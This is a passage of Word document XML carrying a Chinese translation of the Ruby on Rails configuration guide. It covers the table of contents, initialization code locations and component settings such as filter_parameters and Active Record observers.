          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置生成器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1401D8A7"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58" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="25E13405"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59" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 i18n</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B9563E1"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60" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Active Record</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D259431"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61" w:anchor="3-7" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Action Controller</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="65B2F364"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62" w:anchor="3-8" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Action Dispatch</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D302A22"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63" w:anchor="3-9" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Action View</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BCD15EB"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64" w:anchor="3-10" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Action Mailer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="65CEC1B8"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65" w:anchor="3-11" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Active Support</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47EA9885"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66" w:anchor="3-12" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DE9F6A5" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId867" w:anchor="4" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 环境设置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="63A7C0A0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId868" w:anchor="5" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用 Initializer 文件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3595AC2B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId869" w:anchor="6" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>初始化事件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49FAB2A1"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70" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>Rails::Railtie#initializer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31A3AF7E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId871" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Initializers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F9048EA" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId872" w:anchor="7" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>数据库连接池</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0D4A388A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>1 初始化代码的位置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7367BF9A"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Rails 提供四个标准的位置初始化代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2E5CFF" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config/application.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B28BC4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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运行环境相关的配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A88BAF" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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各初始化程序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24039C3B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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后初始化程序(初始化完成后运行的程序)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398D4D63" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>2 先于Rails运行代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDEB384"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有时候你需要在 Rails 加载自己之前运行代码, 将调用代码放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require 'rails/all'</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之上.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0699C605" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>3 配置 Rails 组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544E530E"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一般而言, 配置 Rails 的工作其实就是配置 Rails 的各个组件, 就像配置 Rails 本身一样. 配置文件</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和运行环境相关的配置文件(比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/production.br</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 可以让你设定一些你想传递给所有组件的设置.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD5247D"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例如, 缺省的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件包括这个设置:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="79E53389" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AE5B88A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="599070573"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.filter_parameters += [:password]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68F711D1"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这是给 Rails 本身的设置. 如果你想向单个 Rails 组件传递设置, 你同样可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件里通过同</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象做一样的操作.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="0D1ABB19" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6973734A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="259217132"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.active_record.observers = [:hotel_observer, :review_observer]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5588600F"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Rails 将会使用那些特定的设置来配置 Active Record.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD9FF35"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3.1 一般的Rails配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25207357"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这些配置方法都是由 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象调用的,比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F59769" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config.after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会接受一个代码块,这个代码块将会在 Rails 初始化应用程序完毕_之后_再运行. 那包括框架自身, 引擎和在</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里的所有应用程序初始化程序的初始化.请注意这个代码块_将会_为rake任务运行. 在给其它初始化程序进行配置时会很有用:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="4C22A40B" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
